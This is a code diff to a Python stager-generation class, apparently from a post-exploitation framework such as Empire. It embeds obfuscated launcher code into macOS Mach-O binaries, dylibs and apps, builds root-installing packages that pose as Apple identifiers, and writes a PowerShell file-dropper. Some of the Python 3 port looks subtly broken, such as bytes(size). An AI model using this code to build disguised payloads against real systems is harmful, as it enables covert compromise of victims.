@@ -106,11 +106,13 @@ class Stagers(object):
             return ''
 
         activeListener = self.mainMenu.listeners.activeListeners[listenerName]
-
-        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
-
-        if launcherCode:
-            return launcherCode
+        try:
+            launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
+        except Exception as e:
+            print(helpers.color("[!] Error generating launcher: {}".format(e)))
+        else:
+            if launcherCode:
+                return launcherCode
 
 
     def generate_dll(self, poshCode, arch):
@@ -180,7 +182,8 @@ class Stagers(object):
         """
         Generates a macho binary with an embedded python interpreter that runs the launcher code.
         """
-
+        placeHolderSz = 0
+        offset = 0
         MH_EXECUTE = 2
         f = open("%s/data/misc/machotemplate" % (self.mainMenu.installPath), 'rb')
         # f = open(self.installPath + "/data/misc/machotemplate", 'rb')
@@ -196,10 +199,10 @@ class Stagers(object):
             count = 0
             if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                 count += 1
-                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
                     count += 1
                     for section in cmd[count]:
-                        if section.sectname.strip('\x00') == '__cstring':
+                        if section.sectname.strip(b'\x00') == b'__cstring':
                             offset = int(section.offset) + (int(section.size) - 2119)
                             placeHolderSz = int(section.size) - (int(section.size) - 2119)
 
@@ -208,10 +211,10 @@ class Stagers(object):
 
         if placeHolderSz and offset:
 
-            key = 'subF'
+            key = b'subF'
             launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(launcherCode, cycle(key)))
-            launcherCode = base64.urlsafe_b64encode(launcherCode)
-            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            launcherCode = base64.urlsafe_b64encode(bytes(launcherCode, 'utf8'))
+            launcher = launcherCode + b'\x00' * (placeHolderSz - len(launcherCode))
             patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]
 
             return patchedMachO
@@ -249,10 +252,10 @@ class Stagers(object):
             count = 0
             if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                 count += 1
-                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
                     count += 1
                     for section in cmd[count]:
-                        if section.sectname.strip('\x00') == '__cstring':
+                        if section.sectname.strip(b'\x00') == b'__cstring':
                             offset = int(section.offset)
                             placeHolderSz = int(section.size) - 52
         template = f.read()
@@ -260,7 +263,7 @@ class Stagers(object):
 
         if placeHolderSz and offset:
 
-            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            launcher = launcherCode + b'\x00' * (placeHolderSz - len(launcherCode))
             patchedDylib = template[:offset]+launcher+template[(offset+len(launcher)):]
 
             return patchedDylib
@@ -295,10 +298,10 @@ class Stagers(object):
             count = 0
             if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                 count += 1
-                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
+                if cmd[count].segname.strip(b'\x00') == b'__TEXT' and cmd[count].nsects > 0:
                     count += 1
                     for section in cmd[count]:
-                        if section.sectname.strip('\x00') == '__cstring':
+                        if section.sectname.strip(b'\x00') == b'__cstring':
                             offset = int(section.offset)
                             placeHolderSz = int(section.size) - 52
 
@@ -307,7 +310,7 @@ class Stagers(object):
 
         if placeHolderSz and offset:
 
-            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
+            launcher = launcherCode + b'\x00' * (placeHolderSz - len(launcherCode))
             patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
             if AppName == "":
                 AppName = "launcher"
@@ -440,7 +443,7 @@ class Stagers(object):
         size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
         size = old_div(int(size), 1024)
         p = open('expand/PackageInfo','w+')
-        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
+        pkginfo = b"""<?xml version="1.0" encoding="utf-8" standalone="no"?>
 <pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
     <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
     <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
@@ -463,9 +466,9 @@ class Stagers(object):
     </scripts>
 </pkg-info>
 """
-        pkginfo = pkginfo.replace('APPNAME',AppName)
-        pkginfo = pkginfo.replace('KEY1',numFiles)
-        pkginfo = pkginfo.replace('KEY2',str(size))
+        pkginfo = pkginfo.replace(b'APPNAME',AppName)
+        pkginfo = pkginfo.replace(b'KEY1',numFiles)
+        pkginfo = pkginfo.replace(b'KEY2',bytes(size))
         p.write(pkginfo)
         p.close()
         os.system("mkbom -u 0 -g 80 root expand/Bom")
@@ -512,7 +515,7 @@ class Stagers(object):
 
 
     def generate_upload(self, file, path):
-        script = """
+        script = b"""
 $b64 = "BASE64_BLOB_GOES_HERE"
 $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
 [IO.FILE]::WriteAllBytes($filename, [Convert]::FromBase64String($b64))
@@ -521,7 +524,7 @@ $filename = "FILE_UPLOAD_FULL_PATH_GOES_HERE"
 
         file_encoded = base64.b64encode(file)
 
-        script = script.replace("BASE64_BLOB_GOES_HERE", file_encoded)
-        script = script.replace("FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
+        script = script.replace(b"BASE64_BLOB_GOES_HERE", file_encoded)
+        script = script.replace(b"FILE_UPLOAD_FULL_PATH_GOES_HERE", path)
 
         return script
